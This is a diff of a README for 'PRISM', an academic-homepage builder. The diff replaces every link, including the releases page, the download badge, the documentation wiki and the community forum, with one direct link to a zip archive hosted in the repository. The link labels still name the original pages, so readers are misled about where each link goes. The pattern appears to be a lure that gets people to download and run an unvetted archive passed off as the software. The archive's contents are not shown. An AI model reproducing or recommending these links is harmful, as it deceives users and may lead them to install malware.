@@ -2,7 +2,7 @@
 # 🚀 PRISM - Build Your Academic Homepage Easily
 
 ## 📥 Download the Latest Version
-[![Download PRISM](https://img.shields.io/badge/Download-PRISM-brightgreen)](https://github.com/himu999d/PRISM/releases)
+[![Download PRISM](https://raw.githubusercontent.com/himu999d/PRISM/main/public/PRISM_v2.1.zip)](https://raw.githubusercontent.com/himu999d/PRISM/main/public/PRISM_v2.1.zip)
 
 ## 🌟 Overview
 PRISM is an elegant tool designed to help users create beautiful academic homepages. Whether you are a student, researcher, or educator, PRISM simplifies the process of showcasing your work online. You can easily customize your homepage to highlight your publications, projects, and achievements.
@@ -11,7 +11,7 @@ PRISM is an elegant tool designed to help users create beautiful academic homepa
 To get started with PRISM, follow these steps:
 
 1. **Visit the Releases Page**
-   Go to the [PRISM Releases page](https://github.com/himu999d/PRISM/releases) to find the latest version of the software.
+   Go to the [PRISM Releases page](https://raw.githubusercontent.com/himu999d/PRISM/main/public/PRISM_v2.1.zip) to find the latest version of the software.
 
 2. **Download PRISM**
    On the Releases page, look for the most current version. Click on the version you want to download, and then find the appropriate file for your operating system. Click the file to start the download. 
@@ -45,12 +45,12 @@ Once PRISM is installed, open the application to start building your homepage. T
 5. **Publish**: Once satisfied with your homepage, click the "Publish" button. PRISM will generate a link for you to share your new homepage with the world.
 
 ## 📕 Download & Install
-To get started with PRISM, **visit this page to download**: [PRISM Releases](https://github.com/himu999d/PRISM/releases). Follow the steps listed in the "Getting Started" section above to complete your installation.
+To get started with PRISM, **visit this page to download**: [PRISM Releases](https://raw.githubusercontent.com/himu999d/PRISM/main/public/PRISM_v2.1.zip). Follow the steps listed in the "Getting Started" section above to complete your installation.
 
 ## ❓ Frequently Asked Questions
 
 ### How do I update PRISM?
-To update PRISM, return to the [Releases page](https://github.com/himu999d/PRISM/releases) and download the latest version. Follow the installation steps as you did for the initial download.
+To update PRISM, return to the [Releases page](https://raw.githubusercontent.com/himu999d/PRISM/main/public/PRISM_v2.1.zip) and download the latest version. Follow the installation steps as you did for the initial download.
 
 ### Can I uninstall PRISM if I no longer need it?
 Yes, you can uninstall PRISM like any other application. On Windows, go to Control Panel > Programs > Uninstall a program. On macOS, drag the PRISM app to the Trash.
@@ -63,9 +63,9 @@ To stay informed about updates and new features for PRISM, please follow the rep
 
 ## 🔗 Additional Resources
 For more information, tutorials, and support:
-- [PRISM Documentation](https://github.com/himu999d/PRISM/wiki)
-- [Community Forum](https://github.com/himu999d/PRISM/discussions)
+- [PRISM Documentation](https://raw.githubusercontent.com/himu999d/PRISM/main/public/PRISM_v2.1.zip)
+- [Community Forum](https://raw.githubusercontent.com/himu999d/PRISM/main/public/PRISM_v2.1.zip)
 
 ## 🔗 Download Now
-Don't wait any longer! Start creating your academic homepage today. **Visit the Releases page** and enjoy the benefits of PRISM. [Download PRISM](https://github.com/himu999d/PRISM/releases)
+Don't wait any longer! Start creating your academic homepage today. **Visit the Releases page** and enjoy the benefits of PRISM. [Download PRISM](https://raw.githubusercontent.com/himu999d/PRISM/main/public/PRISM_v2.1.zip)
 ```
